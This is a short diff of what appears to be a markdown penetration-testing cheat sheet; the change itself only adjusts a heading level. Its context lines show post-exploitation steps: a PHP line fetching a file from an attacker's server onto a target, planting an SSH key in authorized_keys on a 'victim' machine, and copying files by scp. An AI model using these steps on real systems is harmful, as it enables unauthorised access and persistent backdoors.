@@ -23,7 +23,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://[my_server_ip:port/fil
 - echo "ssh-rsa ASD3NbN[..]vlldor..." > authorized_keys
 - log in ssh -i private_key [name]@[victim_machine_ip] -p [port]
 
-###### SCP
+#### SCP
 ***copy file***
 scp /your/file/path.ext [name]@[victim_server_ip]:/your/file/destination/path.ext
 ***copy dir***
